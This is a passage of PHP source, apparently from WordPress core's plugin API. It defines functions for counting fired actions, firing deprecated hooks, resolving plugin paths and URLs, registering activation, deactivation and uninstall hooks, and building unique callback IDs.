 * @global int[] $wp_actions Stores the number of times each action was triggered.
 *
 * @param string $hook_name The name of the action hook.
 * @return int The number of times the action hook has been fired.
 */
function did_action( $hook_name ) {
	global $wp_actions;

	if ( ! isset( $wp_actions[ $hook_name ] ) ) {
		return 0;
	}

	return $wp_actions[ $hook_name ];
}

/**
 * Fires functions attached to a deprecated filter hook.
 *
 * When a filter hook is deprecated, the apply_filters() call is replaced with
 * apply_filters_deprecated(), which triggers a deprecation notice and then fires
 * the original filter hook.
 *
 * Note: the value and extra arguments passed to the original apply_filters() call
 * must be passed here to `$args` as an array. For example:
 *
 *     // Old filter.
 *     return apply_filters( 'wpdocs_filter', $value, $extra_arg );
 *
 *     // Deprecated.
 *     return apply_filters_deprecated( 'wpdocs_filter', array( $value, $extra_arg ), '4.9.0', 'wpdocs_new_filter' );
 *
 * @since 4.6.0
 *
 * @see _deprecated_hook()
 *
 * @param string $hook_name   The name of the filter hook.
 * @param array  $args        Array of additional function arguments to be passed to apply_filters().
 * @param string $version     The version of WordPress that deprecated the hook.
 * @param string $replacement Optional. The hook that should have been used. Default empty.
 * @param string $message     Optional. A message regarding the change. Default empty.
 */
function apply_filters_deprecated( $hook_name, $args, $version, $replacement = '', $message = '' ) {
	if ( ! has_filter( $hook_name ) ) {
		return $args[0];
	}

	_deprecated_hook( $hook_name, $version, $replacement, $message );

	return apply_filters_ref_array( $hook_name, $args );
}

/**
 * Fires functions attached to a deprecated action hook.
 *
 * When an action hook is deprecated, the do_action() call is replaced with
 * do_action_deprecated(), which triggers a deprecation notice and then fires
 * the original hook.
 *
 * @since 4.6.0
 *
 * @see _deprecated_hook()
 *
 * @param string $hook_name   The name of the action hook.
 * @param array  $args        Array of additional function arguments to be passed to do_action().
 * @param string $version     The version of WordPress that deprecated the hook.
 * @param string $replacement Optional. The hook that should have been used. Default empty.
 * @param string $message     Optional. A message regarding the change. Default empty.
 */
function do_action_deprecated( $hook_name, $args, $version, $replacement = '', $message = '' ) {
	if ( ! has_action( $hook_name ) ) {
		return;
	}

	_deprecated_hook( $hook_name, $version, $replacement, $message );

	do_action_ref_array( $hook_name, $args );
}

//
// Functions for handling plugins.
//

/**
 * Gets the basename of a plugin.
 *
 * This method extracts the name of a plugin from its filename.
 *
 * @since 1.5.0
 *
 * @global array $wp_plugin_paths
 *
 * @param string $file The filename of plugin.
 * @return string The name of a plugin.
 */
function plugin_basename( $file ) {
	global $wp_plugin_paths;

	// $wp_plugin_paths contains normalized paths.
	$file = wp_normalize_path( $file );

	arsort( $wp_plugin_paths );

	foreach ( $wp_plugin_paths as $dir => $realdir ) {
		if ( strpos( $file, $realdir ) === 0 ) {
			$file = $dir . substr( $file, strlen( $realdir ) );
		}
	}

	$plugin_dir    = wp_normalize_path( WP_PLUGIN_DIR );
	$mu_plugin_dir = wp_normalize_path( WPMU_PLUGIN_DIR );

	// Get relative path from plugins directory.
	$file = preg_replace( '#^' . preg_quote( $plugin_dir, '#' ) . '/|^' . preg_quote( $mu_plugin_dir, '#' ) . '/#', '', $file );
	$file = trim( $file, '/' );
	return $file;
}

/**
 * Register a plugin's real path.
 *
 * This is used in plugin_basename() to resolve symlinked paths.
 *
 * @since 3.9.0
 *
 * @see wp_normalize_path()
 *
 * @global array $wp_plugin_paths
 *
 * @param string $file Known path to the file.
 * @return bool Whether the path was able to be registered.
 */
function wp_register_plugin_realpath( $file ) {
	global $wp_plugin_paths;

	// Normalize, but store as static to avoid recalculation of a constant value.
	static $wp_plugin_path = null, $wpmu_plugin_path = null;

	if ( ! isset( $wp_plugin_path ) ) {
		$wp_plugin_path   = wp_normalize_path( WP_PLUGIN_DIR );
		$wpmu_plugin_path = wp_normalize_path( WPMU_PLUGIN_DIR );
	}

	$plugin_path     = wp_normalize_path( dirname( $file ) );
	$plugin_realpath = wp_normalize_path( dirname( realpath( $file ) ) );

	if ( $plugin_path === $wp_plugin_path || $plugin_path === $wpmu_plugin_path ) {
		return false;
	}

	if ( $plugin_path !== $plugin_realpath ) {
		$wp_plugin_paths[ $plugin_path ] = $plugin_realpath;
	}

	return true;
}

/**
 * Get the filesystem directory path (with trailing slash) for the plugin __FILE__ passed in.
 *
 * @since 2.8.0
 *
 * @param string $file The filename of the plugin (__FILE__).
 * @return string the filesystem path of the directory that contains the plugin.
 */
function plugin_dir_path( $file ) {
	return trailingslashit( dirname( $file ) );
}

/**
 * Get the URL directory path (with trailing slash) for the plugin __FILE__ passed in.
 *
 * @since 2.8.0
 *
 * @param string $file The filename of the plugin (__FILE__).
 * @return string the URL path of the directory that contains the plugin.
 */
function plugin_dir_url( $file ) {
	return trailingslashit( plugins_url( '', $file ) );
}

/**
 * Set the activation hook for a plugin.
 *
 * When a plugin is activated, the action 'activate_PLUGINNAME' hook is
 * called. In the name of this hook, PLUGINNAME is replaced with the name
 * of the plugin, including the optional subdirectory. For example, when the
 * plugin is located in wp-content/plugins/sampleplugin/sample.php, then
 * the name of this hook will become 'activate_sampleplugin/sample.php'.
 *
 * When the plugin consists of only one file and is (as by default) located at
 * wp-content/plugins/sample.php the name of this hook will be
 * 'activate_sample.php'.
 *
 * @since 2.0.0
 *
 * @param string   $file     The filename of the plugin including the path.
 * @param callable $callback The function hooked to the 'activate_PLUGIN' action.
 */
function register_activation_hook( $file, $callback ) {
	$file = plugin_basename( $file );
	add_action( 'activate_' . $file, $callback );
}

/**
 * Sets the deactivation hook for a plugin.
 *
 * When a plugin is deactivated, the action 'deactivate_PLUGINNAME' hook is
 * called. In the name of this hook, PLUGINNAME is replaced with the name
 * of the plugin, including the optional subdirectory. For example, when the
 * plugin is located in wp-content/plugins/sampleplugin/sample.php, then
 * the name of this hook will become 'deactivate_sampleplugin/sample.php'.
 *
 * When the plugin consists of only one file and is (as by default) located at
 * wp-content/plugins/sample.php the name of this hook will be
 * 'deactivate_sample.php'.
 *
 * @since 2.0.0
 *
 * @param string   $file     The filename of the plugin including the path.
 * @param callable $callback The function hooked to the 'deactivate_PLUGIN' action.
 */
function register_deactivation_hook( $file, $callback ) {
	$file = plugin_basename( $file );
	add_action( 'deactivate_' . $file, $callback );
}

/**
 * Sets the uninstallation hook for a plugin.
 *
 * Registers the uninstall hook that will be called when the user clicks on the
 * uninstall link that calls for the plugin to uninstall itself. The link won't
 * be active unless the plugin hooks into the action.
 *
 * The plugin should not run arbitrary code outside of functions, when
 * registering the uninstall hook. In order to run using the hook, the plugin
 * will have to be included, which means that any code laying outside of a
 * function will be run during the uninstallation process. The plugin should not
 * hinder the uninstallation process.
 *
 * If the plugin can not be written without running code within the plugin, then
 * the plugin should create a file named 'uninstall.php' in the base plugin
 * folder. This file will be called, if it exists, during the uninstallation process
 * bypassing the uninstall hook. The plugin, when using the 'uninstall.php'
 * should always check for the 'WP_UNINSTALL_PLUGIN' constant, before
 * executing.
 *
 * @since 2.7.0
 *
 * @param string   $file     Plugin file.
 * @param callable $callback The callback to run when the hook is called. Must be
 *                           a static method or function.
 */
function register_uninstall_hook( $file, $callback ) {
	if ( is_array( $callback ) && is_object( $callback[0] ) ) {
		_doing_it_wrong( __FUNCTION__, __( 'Only a static class method or function can be used in an uninstall hook.' ), '3.1.0' );
		return;
	}

	/*
	 * The option should not be autoloaded, because it is not needed in most
	 * cases. Emphasis should be put on using the 'uninstall.php' way of
	 * uninstalling the plugin.
	 */
	$uninstallable_plugins = (array) get_option( 'uninstall_plugins' );
	$plugin_basename       = plugin_basename( $file );

	if ( ! isset( $uninstallable_plugins[ $plugin_basename ] ) || $uninstallable_plugins[ $plugin_basename ] !== $callback ) {
		$uninstallable_plugins[ $plugin_basename ] = $callback;
		update_option( 'uninstall_plugins', $uninstallable_plugins );
	}
}

/**
 * Calls the 'all' hook, which will process the functions hooked into it.
 *
 * The 'all' hook passes all of the arguments or parameters that were used for
 * the hook, which this function was called for.
 *
 * This function is used internally for apply_filters(), do_action(), and
 * do_action_ref_array() and is not meant to be used from outside those
 * functions. This function does not check for the existence of the all hook, so
 * it will fail unless the all hook exists prior to this function call.
 *
 * @since 2.5.0
 * @access private
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param array $args The collected parameters from the hook that was called.
 */
function _wp_call_all_hook( $args ) {
	global $wp_filter;

	$wp_filter['all']->do_all_hook( $args );
}

/**
 * Builds Unique ID for storage and retrieval.
 *
 * The old way to serialize the callback caused issues and this function is the
 * solution. It works by checking for objects and creating a new property in
 * the class to keep track of the object and new objects of the same class that
 * need to be added.
 *
 * It also allows for the removal of actions and filters for objects after they
 * change class properties. It is possible to include the property $wp_filter_id
 * in your class and set it to "null" or a number to bypass the workaround.
 * However this will prevent you from adding new classes and any new classes
 * will overwrite the previous hook by the same class.
 *
 * Functions and static method callbacks are just returned as strings and
 * shouldn't have any speed penalty.
 *
 * @link https://core.trac.wordpress.org/ticket/3875
 *
 * @since 2.2.3
 * @since 5.3.0 Removed workarounds for spl_object_hash().
 *              `$hook_name` and `$priority` are no longer used,
 *              and the function always returns a string.
 *
 * @access private
 *
 * @param string                $hook_name Unused. The name of the filter to build ID for.
 * @param callable|string|array $callback  The callback to generate ID for. The callback may
 *                                         or may not exist.
 * @param int                   $priority  Unused. The order in which the functions
 *                                         associated with a particular action are executed.
 * @return string Unique function ID for usage as array key.
 */
function _wp_filter_build_unique_id( $hook_name, $callback, $priority ) {
	if ( is_string( $callback ) ) {
		return $callback;
	}

	if ( is_object( $callback ) ) {
		// Closures are currently implemented as objects.
		$callback = array( $callback, '' );
	} else {
		$callback = (array) $callback;
	}

	if ( is_object( $callback[0] ) ) {
		// Object class calling.
		return spl_object_hash( $callback[0] ) . $callback[1];
	} elseif ( is_string( $callback[0] ) ) {
		// Static calling.
		return $callback[0] . '::' . $callback[1];
	}
}
